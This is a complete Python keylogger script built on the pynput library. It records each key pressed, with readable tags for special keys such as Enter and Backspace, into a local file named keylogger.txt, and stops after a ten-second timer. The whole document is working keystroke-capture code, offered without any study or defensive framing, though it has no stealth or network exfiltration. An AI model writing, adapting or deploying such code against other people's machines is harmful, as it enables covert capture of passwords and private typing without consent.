# Need to install ( pip install pynput )
from pynput.keyboard import Listener, Key

# Standard python library
from datetime import datetime, timedelta

special_keys = {
    "Key.space": "[Space]",
    "Key.enter": "[Enter]",
    "Key.tab": "[Tab]",
    "Key.esc": "[Esc]",
    "Key.ctrl_l": "[Ctrl_l]",
    "Key.ctrl_r": "[Ctrl_r]",
    "Key.shift": "[Shift_l]",
    "Key.shift_r": "[Shift_r]",
    "Key.backspace": "[Backspace]",
    "<96>": "[0]",
    "<97>": "[1]",
    "<98>": "[2]",
    "<99>": "[3]",
    "<100>": "[4]",
    "<101>": "[5]",
    "<102>": "[6]",
    "<103>": "[7]",
    "<104>": "[8]",
    "<105>": "[9]"
}


# To listen to the keys and flow it
def on_press(key):
    listen = str(key).replace("'", "")
    if special_keys.get(listen):
        listen = special_keys[listen]
    with open("keylogger.txt", "a") as f:
        f.write(listen)


# To determine the listening time
start = datetime.now()
end = start + timedelta(seconds=10)


# To finish listening
def on_release(key) -> True:
    if datetime.now() >= end:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
